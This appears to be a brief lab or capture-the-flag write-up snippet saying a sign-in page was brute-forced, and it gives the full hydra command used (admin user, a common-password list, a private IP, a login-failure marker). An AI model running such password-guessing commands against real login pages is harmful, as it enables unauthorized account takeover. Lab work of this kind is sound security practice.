Using hydra we tried to bruteforce the sign in page and got access , the hydra command was : 

hydra -l admin -P 100k-most-used-passwords-NCSC.txt -s 80 -f -V 172.18.15.123 http-get-form "/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F="images/WrongAnswer.gif""







